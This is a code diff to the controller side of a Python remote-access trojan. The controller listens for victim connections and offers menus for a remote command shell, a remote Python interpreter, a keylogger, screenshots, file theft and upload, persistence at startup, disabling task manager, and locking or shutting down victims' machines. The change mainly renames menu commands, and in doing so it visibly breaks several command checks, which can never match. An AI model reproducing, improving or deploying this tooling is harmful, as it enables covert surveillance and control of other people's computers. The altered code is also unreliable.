@@ -1,10 +1,6 @@
 import socket, os, time, threading, sys, json
 from queue import Queue
 
-intThreads = 2
-arrJobs = [1, 2]
-queue = Queue()
-
 arrAddresses = []
 arrConnections = []
 
@@ -12,6 +8,8 @@ strHost = "0.0.0.0"
 intPort = 3000
 
 intBuff = 1024
+
+queue = Queue()
 
 # function to return string with quotes removed
 remove_quotes = lambda string: string.replace("\"", "")
@@ -78,47 +76,47 @@ def _decode(data):
 
 
 def menu_help():
-    print("\n--help")
-    print("--l List all connections")
-    print("--i Interact with connection")
-    print("--e Open remote cmd with connection")
-    print("--s Send command to every connection")
-    print("--c Close connection")
-    print("--x Exit and close all connections")
+    print("\n H help")
+    print("L List all connections")
+    print("I Interact with connection")
+    print("E Open remote cmd with connection")
+    print("S Send command to every connection")
+    print("C Close connection")
+    print("X Exit and close all connections")
 
 
 def main_menu():
     while True:
-        strChoice = input("\n>> ")
+        strChoice = input("\n>> ").lower()
 
         refresh_connections()  # refresh connection list
 
-        if strChoice == "--l":
+        if strChoice == "l":
             list_connections()
 
-        elif strChoice[:3] == "--i" and len(strChoice) > 3:
+        elif strChoice[:3] == "i" and len(strChoice) > 3:
             conn = select_connection(strChoice[4:], True)
             if conn is not None:
                 send_commands()
-        elif strChoice == "--help":
+        elif strChoice == "h":
             menu_help()
 
-        elif strChoice[:3] == "--c" and len(strChoice) > 3:
+        elif strChoice[:3] == "c" and len(strChoice) > 3:
             conn = select_connection(strChoice[4:], False)
             if conn is not None:
                 send(b"exit")
                 conn.close()
 
-        elif strChoice == "--x":
+        elif strChoice == "x":
             close()
             break  # break to continue work() function
 
-        elif strChoice[:3] == "--e" and len(strChoice) > 3:
+        elif strChoice[:3] == "e" and len(strChoice) > 3:
             conn = select_connection(strChoice[4:], False)
             if conn is not None:
                 command_shell()
 
-        elif strChoice[:3] == "--s" and len(strChoice) > 3:
+        elif strChoice[:3] == "s" and len(strChoice) > 3:
             send_command_all(strChoice[4:])
         else:
             print("Invalid choice, please try again!")
@@ -409,79 +407,79 @@ def send_command(command):
 
 
 def show_help():
-    print("--help")
-    print("--m Send message")
-    print("--r Receive file from the user")
-    print("--s Send file to the user")
-    print("--p Take screenshot")
-    print("--a (1) Add to startup")
-    print("--a (2) Remove from startup")
-    print("--v View files")
-    print("--u User Info")
-    print("--e Open remote cmd")
-    print("--i Open remote python interpreter")
-    print("--d Disable task manager")
-    print("--k (start) (stop) (dump) Keylogger")
-    print("--x (1) Lock user")
-    print("--x (2) Restart user")
-    print("--x (3) Shutdown user")
-    print("--b Move connection to background")
-    print("--c Close connection")
+    print("H Help")
+    print("M Send message")
+    print("R Receive file from the user")
+    print("S Send file to the user")
+    print("P Take screenshot")
+    print("A (1) Add to startup")
+    print("A (2) Remove from startup")
+    print("V View files")
+    print("U User Info")
+    print("E Open remote cmd")
+    print("I Open remote python interpreter")
+    print("D Disable task manager")
+    print("K (start) (stop) (dump) Keylogger")
+    print("X (1) Lock user")
+    print("X (2) Restart user")
+    print("X (3) Shutdown user")
+    print("B Move connection to background")
+    print("C Close connection")
 
 
 def send_commands():
     show_help()
     try:
         while True:
-            strChoice = input("\nType selection: ")
+            strChoice = input("\nType selection: ").lower()
 
-            if strChoice == "--help":
+            if strChoice == "h":
                 print()
                 show_help()
-            elif strChoice == "--c":
+            elif strChoice == "c":
                 send(b"exit")
                 conn.close()
                 break
-            elif strChoice[:3] == "--m" and len(strChoice) > 3:
+            elif strChoice[:3] == "m" and len(strChoice) > 3:
                 strMsg = "msg" + strChoice[4:]
                 send(strMsg.encode())
-            elif strChoice == "--a 1":
+            elif strChoice == "a 1":
                 startup()
-            elif strChoice == "--a 2":
+            elif strChoice == "a 2":
                 remove_from_startup()
-            elif strChoice == "--u":
+            elif strChoice == "u":
                 user_info()
-            elif strChoice == "--p":
+            elif strChoice == "p":
                 screenshot()
-            elif strChoice == "--i":
+            elif strChoice == "i":
                 python_interpreter()
-            elif strChoice == "--v":
+            elif strChoice == "v":
                 browse_files()
-            elif strChoice == "--s":
+            elif strChoice == "s":
                 send_file()
-            elif strChoice == "--r":
+            elif strChoice == "r":
                 receive()
-            elif strChoice == "--x 1":
+            elif strChoice == "x 1":
                 send(b"lock")
-            elif strChoice == "--x 2":
+            elif strChoice == "x 2":
                 send(b"shutdown")
                 conn.close()
                 break
-            elif strChoice == "--x 3":
+            elif strChoice == "x 3":
                 send(b"restart")
                 conn.close()
                 break
-            elif strChoice == "--b":
+            elif strChoice == "b":
                 break
-            elif strChoice == "--e":
+            elif strChoice == "e":
                 command_shell()
-            elif strChoice == "--d":
+            elif strChoice == "d":
                 disable_taskmgr()
-            elif strChoice == "--k start":
+            elif strChoice == "k start":
                 keylogger("start")
-            elif strChoice == "--k stop":
+            elif strChoice == "k stop":
                 keylogger("stop")
-            elif strChoice == "--k dump":
+            elif strChoice == "k dump":
                 keylogger("dump")
             else:
                 print("Invalid choice, please try again!")
@@ -492,7 +490,7 @@ def send_commands():
 
 
 def create_threads():
-    for _ in range(intThreads):
+    for _ in range(2):
         objThread = threading.Thread(target=work)
         objThread.daemon = True
         objThread.start()
@@ -518,7 +516,7 @@ def work():  # do jobs in the queue
 
 
 def create_jobs():
-    for intThread in arrJobs:
+    for intThread in [1, 2]:
         queue.put(intThread)  # put thread id into list
     queue.join()
 
